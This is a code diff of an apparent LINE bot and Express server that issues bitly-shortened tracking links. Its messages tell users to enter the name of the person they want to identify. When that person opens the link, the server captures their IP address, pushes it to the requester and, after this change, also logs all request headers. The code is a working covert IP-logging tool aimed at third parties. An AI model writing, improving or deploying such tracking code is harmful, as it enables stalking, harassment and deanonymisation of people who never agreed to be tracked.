@@ -37,7 +37,7 @@ app
     let text = "";
     if (req.body.events[0].type === 'message') {
       if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
-        text = "https://rhipsali.github.io/get_ip?pass=" + random + "&userId=" + userId + " \n認証コード: " + random + "\n\n上記のサイトで特定したい相手の名前と元のURL、発行された認証コードを入力してください。\n\n※URL発行後の15秒間はアクセスしてもメッセージが届きません。\nまた15秒後にアクセスしてメッセージが届くのは1つのURLに1回のみです。名前や元のURLを変更したい場合は再度発行してください。";
+        text = "https://rhipsali.github.io/get_ip?pass=" + random + "&userId=" + userId + " \n認証コード: " + random + "\n\n上記のサイトで特定したい相手の名前と元のURL、発行された認証コードを入力してください。\n\n※URL発行後の10秒間はアクセスしてもメッセージが送信されません。\nまた10秒後にアクセスしてメッセージが送信されるのは1つのURLに1回のみです。名前や元のURLを変更したい場合は再度発行してください。";
       } else {
         text = "URLを発行したい場合「URLを発行したい」「URLを生成して」などと話しかけてください";
       };
@@ -81,7 +81,7 @@ app
       id: userId,
       pass: pass
     };
-    const longUrl = "https://get-ip-nero.herokuapp.com/get?" + qs.stringify(query),
+    const longUrl = "https://get-ip-nero.herokuapp.com/get/ip/nero?" + qs.stringify(query),
     req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
       access_token: bitly_token,
       longUrl: longUrl
@@ -97,19 +97,24 @@ app
       res.send(JSON.stringify({access_url: generated}));
       setTimeout(() => {
         push_status = true;
-      }, 15000);
+      }, 10000);
     });
   })
-  .get("/get", (req, res) => {
+  .get("/get/ip/nero", (req, res) => {
     const nom = req.query.name, id = req.query.id, pass = req.query.pass;
     original = req.query.original;
     res.sendFile(__dirname + '/open.html');
+    if (!nom || !id || !pass || !original) {
+      push_status = false;
+    };
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
     console.log(`名前: ${nom}\nIPアドレス: ${str}`);
+    console.log(req.headers);
     if(push_status && id && pass) {
       setTimeout( () => {
-        pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}`, id)
+        pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}`, id);
+
         push_status = false;
       }, 300);
     };
